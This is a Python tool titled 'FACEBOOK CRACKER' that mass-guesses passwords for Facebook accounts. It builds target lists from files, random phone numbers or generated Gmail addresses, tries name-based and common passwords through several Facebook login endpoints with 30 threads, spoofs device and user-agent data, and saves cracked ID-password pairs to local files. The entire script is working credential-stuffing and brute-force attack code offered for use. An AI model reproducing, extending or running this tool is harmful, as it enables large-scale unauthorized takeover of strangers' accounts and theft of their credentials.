#!/usr/bin/env python3
# TOOL: BILAL AHMAD - FACEBOOK CRACKER
# DEVELOPER: فيصل سعيدي
# VERSION: 30.0 ULTIMATE EDITION

import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup

# -----------------------( COLORS FANTASY EDITION )-----------------------#
R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
C = '\033[1;96m'
W = '\033[1;97m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\033[1;37m'
E = '\033[1;93m'
F = '\033[1;94m'
GD = '\033[1;33m'
PK = '\033[1;35m'
GL = '\033[1;36m'
BR = '\033[1;90m'

# -----------------------( CHECK MODULES )-----------------------#
try:
    import requests, bs4
except ModuleNotFoundError:
    print(f'{R}[!] Installing missing modules...{W}')
    os.system('pip install requests bs4 > /dev/null 2>&1')

# -----------------------( FACEBOOK PACKAGES )-----------------------#
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana')

# -----------------------( LOAD ANDROID MODELS )-----------------------#
android_models = []
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt', timeout=10).text.splitlines()
    android_models = [line for line in xx if line]
except:
    android_models = ["SM-G998B|samsung|{density=2.75,width=720,height=1600}", "Pixel 6|Google|{density=2.5,width=1080,height=2400}"]

# -----------------------( LOAD USER AGENTS )-----------------------#
usr = []
try:
    xd = requests.get('https://raw.githubusercontent.com/SHaYanxALyan/SA/main/sk.txt', timeout=10).text.splitlines()
    usr = [u for u in xd if u]
except:
    usr = ["Dalvik/2.1.0"]

# -----------------------( DEVICE INFO )-----------------------#
def get_device_info():
    try:
        android_version = subprocess.check_output('getprop ro.build.version.release', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace('\n', '')
        model = subprocess.check_output('getprop ro.product.model', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace('\n', '')
        build = subprocess.check_output('getprop ro.build.id', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace('\n', '')
        fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace('\n', '')
        fbbd = subprocess.check_output('getprop ro.product.brand', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace('\n', '')
        fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').replace(',', ':').replace('\n', '')
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').split(',')[0].replace('\n', '')
        except:
            fbcr = 'ZONG'
    except:
        android_version, model, build, fbmf, fbbd, fbca, fbcr = '11', 'Unknown', 'RKQ1.211119.001', 'Unknown', 'Unknown', 'arm64-v8a', 'ZONG'
    
    return {
        'android_version': android_version,
        'model': model,
        'build': build,
        'fblc': 'en_US',
        'fbmf': fbmf,
        'fbbd': fbbd,
        'fbdv': model,
        'fbsv': android_version,
        'fbca': fbca,
        'fbdm': '{density=2.75,width=720,height=1600}',
        'fbcr': fbcr
    }

device = get_device_info()
sim_id = device['fbcr']

# -----------------------( USER AGENTS GENERATOR )-----------------------#
def generate_user_agents(count=5000):
    ugen = []
    gt = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1040', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450'])
    
    for _ in range(count):
        aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
        b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
        c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
        e = random.randrange(1, 999)
        f = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/533.1'
        fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(fullagnt)
    
    return ugen

ugen = generate_user_agents(5000)

# -----------------------( FANTASY LOGO )-----------------------#
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

LOGO = f"""
{GD}╔══════════════════════════════════════════════════════════════════╗
{GD}║{PK}                                                              {GD}║
{GD}║{PK}     ██████╗ ██╗██╗      █████╗ ██╗                         {GD}║
{GD}║{PK}     ██╔══██╗██║██║     ██╔══██╗██║                         {GD}║
{GD}║{PK}     ██████╔╝██║██║     ███████║██║                         {GD}║
{GD}║{PK}     ██╔══██╗██║██║     ██╔══██║██║                         {GD}║
{GD}║{PK}     ██████╔╝██║███████╗██║  ██║███████╗                    {GD}║
{GD}║{PK}     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝                    {GD}║
{GD}║{PK}                                                              {GD}║
{GD}║{C}     ███████╗ █████╗ ██╗███████╗███████╗██████╗              {GD}║
{GD}║{C}     ██╔════╝██╔══██╗██║██╔════╝██╔════╝██╔══██╗             {GD}║
{GD}║{C}     ███████╗███████║██║█████╗  █████╗  ██████╔╝             {GD}║
{GD}║{C}     ╚════██║██╔══██║██║██╔══╝  ██╔══╝  ██╔══██╗             {GD}║
{GD}║{C}     ███████║██║  ██║██║██║     ███████╗██║  ██║             {GD}║
{GD}║{C}     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝             {GD}║
{GD}║{PK}                                                              {GD}║
{GD}║{Y}          ╔══════════════════════════════════════════╗         {GD}║
{GD}║{Y}          ║{GD}     {PK}فيصل سعيدي{GD} - {C}FACEBOOK CRACKER v30.0{Y}          ║         {GD}║
{GD}║{Y}          ║{G}     STATUS: ULTIMATE EDITION{Y}                  ║         {GD}║
{GD}║{Y}          ║{C}     OK ✓ | CP 🔒 | 2FA ⚠️{Y}                     ║         {GD}║
{GD}║{Y}          ╚══════════════════════════════════════════╝         {GD}║
{GD}║{PK}                                                              {GD}║
{GD}╚══════════════════════════════════════════════════════════════════╝{W}
"""

def linex():
    print(f"{GD}{'─' * 62}{W}")

# -----------------------( GLOBALS )-----------------------#
loop = 0
oks = []
cps = []
twf = []
pcp = []

# -----------------------( MAIN MENU )-----------------------#
def menu():
    global pcp
    clear()
    print(LOGO)
    linex()
    print(f" {C}[1]{W} File cloning")
    print(f" {C}[2]{W} Random cloning")
    print(f" {C}[3]{W} Gmail cloning")
    print(f" {C}[4]{W} Contact on WhatsApp")
    print(f" {C}[0]{W} Exit menu")
    linex()
    xd = input(f" {G}[?]{W} Choose an option: {C}")
    
    if xd in ['1', '01']:
        clear()
        print(LOGO)
        print(f" {Y}[!]{W} Put file example: /sdcard/File.txt etc..")
        linex()
        file = input(f" {G}[?]{W} Put file path: {C}")
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(f" {R}[!]{W} File location not found")
            time.sleep(1)
            menu()
            return
        
        clear()
        print(LOGO)
        print(f" {Y}[!]{W} All methods working")
        linex()
        print(f" {C}[1]{W} Method 1 {G}(fast)")
        print(f" {C}[2]{W} Method 2 {G}(best)")
        print(f" {C}[3]{W} Method 3 {G}(v.fast)")
        print(f" {C}[4]{W} Method 4 {G}(best)")
        print(f" {C}[5]{W} Method 5 {G}(slow)")
        print(f" {C}[6]{W} Method 6 {G}(stable)")
        print(f" {C}[7]{W} Method 7 {G}(b-api)")
        print(f" {C}[8]{W} Method 8 {G}(graph)")
        linex()
        mthd = input(f" {G}[?]{W} Choose: {C}")
        linex()
        plist = []
        try:
            ps_limit = int(input(f" {G}[?]{W} How many passwords: {C}"))
        except:
            ps_limit = 1
        
        clear()
        print(LOGO)
        print(f" {Y}[!]{W} Example: first last, first123, first@123")
        linex()
        for i in range(ps_limit):
            plist.append(input(f" {G}[{i+1}]{W} Password: {C}"))
        
        clear()
        print(LOGO)
        print(f" {Y}[?]{W} Show CP accounts? (y/n):")
        linex()
        cx = input(f" {G}[?]{W} Choose: {C}")
        pcp = ['y'] if cx.lower() in ['y', 'yes', '1'] else ['n']
        
        with tred(max_workers=30) as crack_submit:
            clear()
            print(LOGO)
            print(f" {G}[+]{W} Total accounts: {C}{len(fo)}{W}")
            print(f" {Y}[!]{W} Process running in background")
            linex()
            for user in fo:
                try:
                    ids, names = user.split('|')
                except:
                    ids = user
                    names = "User User"
                
                passlist = plist
                
                if mthd in ['1', '01']:
                    crack_submit.submit(api1, ids, names, passlist)
                elif mthd in ['2', '02']:
                    crack_submit.submit(api2, ids, names, passlist)
                elif mthd in ['3', '03']:
                    crack_submit.submit(api3, ids, names, passlist)
                elif mthd in ['4', '04']:
                    crack_submit.submit(api4, ids, names, passlist)
                elif mthd in ['5', '05']:
                    crack_submit.submit(api5, ids, names, passlist)
                elif mthd in ['6', '06']:
                    crack_submit.submit(api6, ids, names, passlist)
                elif mthd in ['7', '07']:
                    crack_submit.submit(api7, ids, names, passlist)
                elif mthd in ['8', '08']:
                    crack_submit.submit(api8, ids, names, passlist)
        
        print(W)
        linex()
        print(f" {G}[✓]{W} Process completed!")
        print(f" {G}[OK]{W}: {C}{len(oks)}{W} | {Y}[CP]{W}: {C}{len(cps)}{W} | {P}[2FA]{W}: {C}{len(twf)}{W}")
        linex()
        input(f" {G}[!]{W} Press Enter to back...")
        menu()
        
    elif xd in ['2', '02']:
        pak()
    elif xd in ['3', '03']:
        gmail()
    elif xd in ['4', '04']:
        os.system('xdg-open https://chat.whatsapp.com/DX4hUHdAdkH8TdfBlKSwIu')
        menu()
    elif xd in ['0', '00']:
        print(f" {G}[✓]{W} Thanks for using {PK}فيصل سعيدي{W}!")
        sys.exit(0)
    else:
        print(f" {R}[!]{W} Option not found!")
        time.sleep(1)
        menu()

# -----------------------( API METHODS )-----------------------#
def api1(ids, names, passlist):
    global loop, oks, cps, twf, pcp
    sys.stdout.write(f'\r{C}[M1]{W} {loop} | {G}OK:{len(oks)} | {Y}CP:{len(cps)} | {P}2FA:{len(twf)} ')
    sys.stdout.flush()
    
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            application_version = f"{random.randint(111,555)}.0.0.{random.randrange(9,49)}{random.randint(111,555)}"
            application_version_code = str(random.randint(100000000, 999999999))
            __iam_genius = random.choice(android_models) if android_models else "SM-G998B|samsung|{density=2.75,width=720,height=1600}"
            phone_company = __iam_genius.split('|')[1] if '|' in __iam_genius else "samsung"
            dvlk = random.choice(usr) if usr else "Dalvik/2.1.0"
            
            ua_string = f'{dvlk} [FBAN/FB4A;FBAV/{application_version};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{application_version_code};FBMF/{phone_company};FBBD/{phone_company};FBDV/{phone_company};FBSV/8.1.0;;FBDM/{{density=2.75,height=1440,width=720}};]'
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claim': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'machine_id': ''.join(random.choices(string.ascii_letters + string.digits + '_', k=24)),
                'login_location_accuracy_m': '1.0',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'encrypted_msisdn': '',
                'currently_logged_in_userid': '0',
                'locale': 'en_PK',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-type': 'unknown',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': ua_string,
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-friendly-name': 'authenticate',
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url, data=data, headers=headers, timeout=15).json()
            
            if 'session_key' in po:
                print(f'\r{G}[✓ OK]{W} {ids} | {pas}')
                with open('/sdcard/Faisal-OK.txt', 'a') as f:
                    f.write(f'{ids}|{pas}\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(po.get('error_msg', '')):
                if pcp[0] == 'y':
                    print(f'\r{Y}[🔒 CP]{W} {ids} | {pas}')
                with open('/sdcard/Faisal-CP.txt', 'a') as f:
                    f.write(f'{ids}|{pas}\n')
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        pass

# -----------------------( SIMPLIFIED API METHODS 2-8 )-----------------------#
def api2(ids, names, passlist):
    global loop, oks, cps, pcp
    sys.stdout.write(f'\r{C}[M2]{W} {loop} | {G}OK:{len(oks)} | {Y}CP:{len(cps)} ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            session = requests.Session()
            ua = random.choice(ugen) if ugen else "Mozilla/5.0"
            headers = {'User-Agent': ua}
            data = {"email": ids, "password": pas}
            try:
                res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers, timeout=10).json()
                if 'session_key' in res:
                    print(f'\r{G}[✓ OK]{W} {ids} | {pas}')
                    with open('/sdcard/Faisal-OK.txt', 'a') as f:
                        f.write(f'{ids}|{pas}\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in str(res.get('error_msg', '')):
                    if pcp[0] == 'y':
                        print(f'\r{Y}[🔒 CP]{W} {ids} | {pas}')
                    with open('/sdcard/Faisal-CP.txt', 'a') as f:
                        f.write(f'{ids}|{pas}\n')
                    cps.append(ids)
                    break
            except:
                continue
        loop += 1
    except:
        loop += 1

def api3(ids, names, passlist):
    global loop, oks, cps, pcp
    sys.stdout.write(f'\r{C}[M3]{W} {loop} | {G}OK:{len(oks)} | {Y}CP:{len(cps)} ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            data = {"email": ids, "password": pas, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
            try:
                res = requests.post('https://graph.facebook.com/v20.0/oauth/access_token', data=data, timeout=10).json()
                if 'access_token' in res:
                    print(f'\r{G}[✓ OK]{W} {ids} | {pas}')
                    with open('/sdcard/Faisal-OK.txt', 'a') as f:
                        f.write(f'{ids}|{pas}\n')
                    oks.append(ids)
                    break
            except:
                continue
        loop += 1
    except:
        loop += 1

def api4(ids, names, passlist):
    api1(ids, names, passlist)

def api5(ids, names, passlist):
    api2(ids, names, passlist)

def api6(ids, names, passlist):
    global loop, oks, cps, pcp
    sys.stdout.write(f'\r{C}[M6]{W} {loop} | {G}OK:{len(oks)} | {Y}CP:{len(cps)} ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            session = requests.Session()
            try:
                login_page = session.get('https://mbasic.facebook.com/login/', timeout=10)
                lsd = re.search(r'name="lsd" value="(.*?)"', login_page.text)
                if lsd:
                    data = {'email': ids, 'pass': pas, 'lsd': lsd.group(1)}
                    res = session.post('https://mbasic.facebook.com/login/device-based/validate-password/', data=data, timeout=10)
                    if 'c_user' in session.cookies.get_dict():
                        print(f'\r{G}[✓ OK]{W} {ids} | {pas}')
                        with open('/sdcard/Faisal-OK.txt', 'a') as f:
                            f.write(f'{ids}|{pas}\n')
                        oks.append(ids)
                        break
            except:
                continue
        loop += 1
    except:
        loop += 1

def api7(ids, names, passlist):
    api6(ids, names, passlist)

def api8(ids, names, passlist):
    api6(ids, names, passlist)

# -----------------------( RANDOM CLONING )-----------------------#
def pak():
    global loop, oks, cps, pcp
    clear()
    print(LOGO)
    print(f" {Y}[!]{W} Code example: 0306, 0315, 0335, 0345")
    code = input(f" {G}[?]{W} Put code: {C}")
    try:
        limit = int(input(f" {G}[?]{W} Put limit (e.g., 5000): {C}"))
    except:
        limit = 5000
    
    clear()
    print(LOGO)
    print(f" {C}[1]{W} Method 1 {G}(best)")
    print(f" {C}[2]{W} Method 2 {G}(v-fast)")
    print(f" {C}[3]{W} Method 3 {G}(b-api)")
    linex()
    mthd = input(f" {G}[?]{W} Choose: {C}")
    
    users = []
    for _ in range(limit):
        nmbr = ''.join(random.choice(string.digits) for _ in range(7))
        users.append(code + nmbr)
    
    with tred(max_workers=30) as executor:
        clear()
        print(LOGO)
        print(f" {G}[+]{W} Total IDs: {C}{len(users)}{W}")
        print(f" {Y}[!]{W} Process running...")
        linex()
        
        for uid in users:
            passlist = [uid, '123456', '12345678', 'password', 'khan123']
            if mthd in ['1', '01']:
                executor.submit(api1, uid, "User User", passlist)
            elif mthd in ['2', '02']:
                executor.submit(api2, uid, "User User", passlist)
            else:
                executor.submit(api6, uid, "User User", passlist)
    
    print(W)
    linex()
    print(f" {G}[✓]{W} Process completed!")
    print(f" {G}[OK]{W}: {C}{len(oks)}{W} | {Y}[CP]{W}: {C}{len(cps)}{W}")
    linex()
    input(f" {G}[!]{W} Press Enter to back...")
    menu()

# -----------------------( GMAIL CLONING )-----------------------#
def gmail():
    global loop, oks, cps, pcp
    clear()
    print(LOGO)
    print(f" {Y}[!]{W} Example: ramzan, ali, sajjad")
    linex()
    first = input(f" {G}[?]{W} First name: {C}")
    linex()
    print(f" {Y}[!]{W} Example: khan, ahmad, ali")
    linex()
    last = input(f" {G}[?]{W} Last name: {C}")
    linex()
    print(f" {Y}[!]{W} Example: @gmail.com")
    linex()
    domain = input(f" {G}[?]{W} Domain: {C}")
    linex()
    try:
        limit = int(input(f" {G}[?]{W} Limit: {C}"))
    except:
        limit = 5000
    
    clear()
    print(LOGO)
    print(f" {C}[1]{W} Method 1 {G}(best)")
    print(f" {C}[2]{W} Method 2 {G}(v-fast)")
    print(f" {C}[3]{W} Method 3 {G}(b-api)")
    linex()
    mthd = input(f" {G}[?]{W} Choose: {C}")
    
    emails = []
    for _ in range(limit):
        num = ''.join(random.choice(string.digits) for _ in range(random.choice([3, 4])))
        emails.append(f"{first.lower()}{last.lower()}{num}{domain}|{first} {last}")
    
    with tred(max_workers=30) as executor:
        clear()
        print(LOGO)
        print(f" {G}[+]{W} Total emails: {C}{len(emails)}{W}")
        print(f" {Y}[!]{W} Process running...")
        linex()
        
        for email in emails:
            try:
                ids, names = email.split('|')
            except:
                ids = email
                names = f"{first} {last}"
            
            passlist = [f"{first.lower()}{last.lower()}", f"{first.lower()}123", f"{last.lower()}123", "123456", "password"]
            
            if mthd in ['1', '01']:
                executor.submit(api1, ids, names, passlist)
            elif mthd in ['2', '02']:
                executor.submit(api2, ids, names, passlist)
            else:
                executor.submit(api6, ids, names, passlist)
    
    print(W)
    linex()
    print(f" {G}[✓]{W} Process completed!")
    print(f" {G}[OK]{W}: {C}{len(oks)}{W} | {Y}[CP]{W}: {C}{len(cps)}{W}")
    linex()
    input(f" {G}[!]{W} Press Enter to back...")
    menu()

# -----------------------( MAIN )-----------------------#
if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!]{W} Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!]{W} Error: {e}")
        sys.exit(1)